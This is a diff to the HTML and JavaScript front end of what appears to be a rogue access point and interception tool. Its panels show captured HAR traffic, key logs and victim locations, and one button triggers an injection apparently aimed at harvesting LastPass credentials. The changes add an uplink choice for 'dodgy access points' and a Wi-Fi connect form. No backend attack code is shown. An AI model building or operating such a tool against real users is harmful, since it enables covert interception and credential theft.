@@ -25,15 +25,16 @@
               <span class="onoffswitch-switch"></span>
             </label>
           </div> -->
-          <h4>Simple Proxy</h4>
-          <small>Toggle the HAR collector</small>
-          <div class="miniOnoffswitch">
-              <input type="checkbox" name="miniOnoffswitch" class="miniOnoffswitch-checkbox" id="toggleHarCollection">
-              <label class="miniOnoffswitch-label" for="toggleHarCollection">
-                  <span class="miniOnoffswitch-inner"></span>
-                  <span class="miniOnoffswitch-switch"></span>
+          <div class="onoffswitch">
+              <input type="checkbox" name="onoffswitch" class="onoffswitch-checkbox" id="toggleHarCollection">
+              <label class="onoffswitch-label" for="toggleHarCollection">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
               </label>
           </div>
+          <h4>Collect Requests</h4>
+          <small>Toggle the HAR collector</small>
+
         </li>
 
         <!-- <li class="list-group-item">
@@ -171,6 +172,7 @@
         <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Har Viewer</a></li>
         <li role="presentation"><a href="#logs" aria-controls="logs" role="tab" data-toggle="tab">Key Logs</a></li>
         <li role="presentation"><a href="#locations" onclick="mapLoad()" aria-controls="locations" role="tab" data-toggle="tab">Locations</a></li>
+        <li role="presentation"><a href="#ConnectWifi" aria-controls="ConnectWifi" role="tab" data-toggle="tab">Connect To Wifi</a></li>
         <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab">Create Access Points</a></li>
         <li role="presentation"><a href="#wifiRequests" aria-controls="wifiRequests" role="tab" data-toggle="tab"><s>Discover Local WiFi Requests</s></a></li>
         
@@ -211,7 +213,31 @@
         <div role="tabpanel" class="tab-pane" id="CreateAP">
           <div class="accesspoint">
           Name: <input type="text" id="apname" class="btn .input-prepend" title="name for the wifi access point" placeholder="access point name">
+          connection: 
+          <div class="btn-group harList">
+                <button type="button" class="btn btn-default dropdown-toggle" id="connectionButton" data-toggle="dropdown" aria-expanded="false">
+                  Select Connection Type <span class="caret"></span>
+                </button>
+                <ul class="dropdown-menu" role="menu" id="connectiontype">
+                  <li><a href="#" id="connectiontypeEth0">eth0</a></li>
+                  <li><a href="#" id="connectiontypewlan1">wlan1</a></li>
+                </ul>
+              </div>
           <button type="submit" class="btn" id="createaccesspoint">Create!</button>
+          </div>
+
+          <div>
+            <div id="wifiError" class="wifi">
+            </div>
+            <div if="wifiOutput" class="wifi">
+            </div>
+          </div>
+        </div>
+        <div role="tabpanel" class="tab-pane" id="ConnectWifi">
+          <div class="accesspoint">
+          SSID: <input type="text" id="wifiName" class="btn .input-prepend" title="ssid" placeholder="SSID">
+          PASSWORD: <input type="text" id="wifiPassword" class="btn .input-prepend" title="password" placeholder="p4ssw0rd">
+          <button type="submit" class="btn" id="connectoToWifi">Connect!</button>
           </div>
           <div>
             <div id="wifiError" class="wifi">
@@ -260,6 +286,7 @@ var opts = {
   var handleGetRequest = function(endpoint) {
       target.style.zIndex = 1000;
       spinner.spin(target);
+      console.log(endpoint)
       $.get( "/"+endpoint)
       .done(function(data) {
         target.style.zIndex = 0;
@@ -287,7 +314,9 @@ var opts = {
 
   $("#requestLastpass").click( function () { handleGetRequest("TriggerInjection?trigger=requestlasspass") });
 
-  $("#createaccesspoint").click( function () { handleGetRequest("CreateAccessPoint?name="+$("#apname").val()) });
+  $("#createaccesspoint").click( function () { handleGetRequest("CreateAccessPoint?name="+$("#apname").val()+"&connection="+connectionType) });
+
+  $("#connectoToWifi").click( function () { handleGetRequest("ConnectToWifi?wifiName="+$("#wifiName").val()+"&wifiPassword="+$("#wifiPassword").val()) });
 
   $("#gethars").click(function() {
     $("#clients").html("")
@@ -413,6 +442,16 @@ $(document).ready(function() {
   console.log(spinner)
   target = document.getElementById('spinner');
   spinner = new Spinner(opts);
+
+  connectionType = "";
+  //handle when a connection type is selected from the drop down, to create dodgy access points...
+  $('#connectiontype li > a').click(function(e){
+    console.log("selected: ", this.innerHTML);
+    connectionType = this.innerHTML;
+    $('#connectionButton').html(this.innerHTML + " <span class=\"caret\"></span>");
+  });
+
+
 })
 
 </script>
